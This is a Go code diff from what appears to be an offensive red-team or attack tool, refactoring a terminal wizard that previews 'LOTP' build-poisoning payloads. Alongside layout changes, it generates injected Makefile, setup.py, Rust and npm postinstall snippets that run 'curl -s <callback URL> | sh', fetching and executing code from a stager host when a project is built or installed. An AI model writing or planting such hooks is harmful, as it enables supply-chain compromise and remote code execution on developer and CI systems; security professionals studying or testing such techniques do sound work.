@@ -2205,14 +2205,18 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 
 	callbackURL := m.config.ExternalURL() + "/r/<stager-id>"
 
-	boxWidth := innerWidth
-	boxPad := ""
-	boxInner := boxWidth - 4
-
+	boxPad := pad
+	boxPadWidth := lipgloss.Width(boxPad)
+	boxWidth := innerWidth - boxPadWidth*2
+	if boxWidth < 12 {
+		boxWidth = innerWidth
+		boxPad = ""
+	}
 	if isDynamicScript && len(targets) > 0 {
+		curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
 		for _, target := range targets {
-			lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, boxInner, target, []string{
-				warningColor.Render("curl -s " + callbackURL + " | sh"),
+			lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, target, []string{
+				warningColor.Render(curlCmd),
 				"... (rest of existing script) ...",
 			})...)
 		}
@@ -2225,7 +2229,7 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 		if preview == "" {
 			preview = lotpDefaultPreview(tool, callbackURL)
 		}
-		lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, boxInner, payloadFile, strings.Split(preview, "\n"))...)
+		lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, innerWidth, payloadFile, strings.Split(preview, "\n"))...)
 	}
 
 	warningFile := "target files"
@@ -2245,41 +2249,60 @@ func (m *Model) buildWizardStep3LOTP(width int) []string {
 	return lines
 }
 
-func (m *Model) renderPreviewBox(boxPad string, boxWidth, _ int, filename string, contentLines []string) []string {
-	previewStyle := lipgloss.NewStyle().
-		Border(lipgloss.RoundedBorder()).
-		BorderForeground(mutedColorVal).
-		Width(boxWidth - 2).
-		PaddingLeft(1)
-
+func (m *Model) renderPreviewBox(boxPad string, boxWidth, totalWidth int, filename string, contentLines []string) []string {
 	content := strings.Join(contentLines, "\n")
-	box := previewStyle.Render(content)
+	box := renderPreviewBoxContent(boxWidth, content)
+	actualBoxWidth := lipgloss.Width(box)
 
 	var lines []string
 	fnLabel := mutedColor.Render("  " + filename)
-	fnPad := boxWidth - lipgloss.Width(fnLabel)
+	fnPad := actualBoxWidth - lipgloss.Width(fnLabel)
 	if fnPad < 0 {
 		fnPad = 0
 	}
-	lines = append(lines, boxPad+fnLabel+strings.Repeat(" ", fnPad))
+	lines = append(lines, padRight(boxPad+fnLabel+strings.Repeat(" ", fnPad), totalWidth))
 	for _, bl := range strings.Split(box, "\n") {
-		lines = append(lines, boxPad+bl)
+		lines = append(lines, padRight(boxPad+bl, totalWidth))
 	}
 	return lines
 }
 
+func renderPreviewBoxContent(maxWidth int, content string) string {
+	if maxWidth < 1 {
+		maxWidth = 1
+	}
+
+	previewStyle := lipgloss.NewStyle().
+		Border(lipgloss.RoundedBorder()).
+		BorderForeground(mutedColorVal).
+		PaddingLeft(1)
+
+	for width := maxWidth; width >= 1; width-- {
+		box := previewStyle.Width(width).Render(content)
+		if lipgloss.Width(box) <= maxWidth {
+			return box
+		}
+	}
+
+	return previewStyle.Width(1).Render(content)
+}
+
 func lotpDefaultPreview(tool, callbackURL string) string {
-	cb := callbackURL
+	curlCmd := lotpPreviewCurlPipeShCommand(callbackURL)
 	switch tool {
 	case "make":
-		return ".PHONY: all\nall:\n\t@curl -s " + cb + " | sh\n\t@$(MAKE) -f Makefile.real all"
+		return ".PHONY: all\nall:\n\t@" + curlCmd + "\n\t@$(MAKE) -f Makefile.real all"
 	case "pip":
-		return "from setuptools import setup\nimport os\nos.system(\"curl -s " + cb + "|sh\")\nsetup(name='pkg', version='1.0.0')"
+		return "from setuptools import setup\nimport os\nos.system(" + fmt.Sprintf("%q", curlCmd) + ")\nsetup(name='pkg', version='1.0.0')"
 	case "cargo":
-		return "fn main() {\n  std::process::Command::new(\"sh\")\n    .arg(\"-c\").arg(\"curl -s " + cb + "|sh\")\n    .output();\n}"
+		return "fn main() {\n  std::process::Command::new(\"sh\")\n    .arg(\"-c\").arg(" + fmt.Sprintf("%q", curlCmd) + ")\n    .output();\n}"
 	default:
-		return "{\n  \"name\": \"build-tools\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": \"curl -s " + cb + "|sh\"\n  }\n}"
+		return "{\n  \"name\": \"build-tools\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": " + fmt.Sprintf("%q", curlCmd) + "\n  }\n}"
 	}
+}
+
+func lotpPreviewCurlPipeShCommand(callbackURL string) string {
+	return fmt.Sprintf("curl -s '%s' | sh", strings.ReplaceAll(callbackURL, "'", "'\"'\"'"))
 }
 
 func formatWizardContent(prefix, label, value string, width int) string {
